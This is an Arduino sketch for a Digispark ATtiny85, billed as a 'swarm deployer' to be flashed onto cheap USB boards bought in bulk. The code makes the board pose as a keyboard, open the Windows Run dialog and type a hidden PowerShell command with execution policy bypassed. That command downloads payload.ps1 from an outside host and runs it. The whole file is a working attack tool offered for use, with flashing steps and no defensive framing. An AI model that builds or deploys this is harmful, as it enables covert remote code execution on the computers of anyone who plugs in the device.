// ============================================================================
// Aries Swarm Deployer — Digispark ATtiny85 USB HID Payload
// ============================================================================
// 
// HARDWARE: Digispark ATtiny85 (~$1.50 each, buy 100-pack on AliExpress)
//
// FLASHING WITH ARDUINO IDE:
//   1. File → Preferences → Additional Board Manager URLs:
//      http://digistump.com/package_digistump_index.json
//   2. Tools → Board → Boards Manager → search "Digistump" → Install
//   3. Tools → Board → Digispark (Default - 16.5 MHz)
//   4. Sketch → Upload (plug in Digispark when prompted)
//
// IMPORTANT: Change PAYLOAD_URL below to your hosted payload.ps1 URL
// Keep the command SHORT — ATtiny85 has ~6KB usable flash.
// ============================================================================

#include "DigiKeyboard.h"

// *** CHANGE THIS URL ***
#define PAYLOAD_CMD "powershell -w hidden -ep bypass -c \"irm https://gateway.doomtrader.com/api/usb-swarm/payload.ps1|iex\""

void setup() {
  // Wait for host to recognize the USB device
  DigiKeyboard.delay(2000);
  
  // Ensure all modifier keys are released
  DigiKeyboard.sendKeyStroke(0);
  
  // Win+R → Open Run dialog
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(600);
  
  // Type the payload command
  DigiKeyboard.print(PAYLOAD_CMD);
  DigiKeyboard.delay(200);
  
  // Press Enter
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  
  // Done — LED blink to confirm
  pinMode(1, OUTPUT);
  for (int i = 0; i < 3; i++) {
    digitalWrite(1, HIGH);
    DigiKeyboard.delay(200);
    digitalWrite(1, LOW);
    DigiKeyboard.delay(200);
  }
}

void loop() {
  // Nothing — one-shot payload
  DigiKeyboard.delay(60000);
}
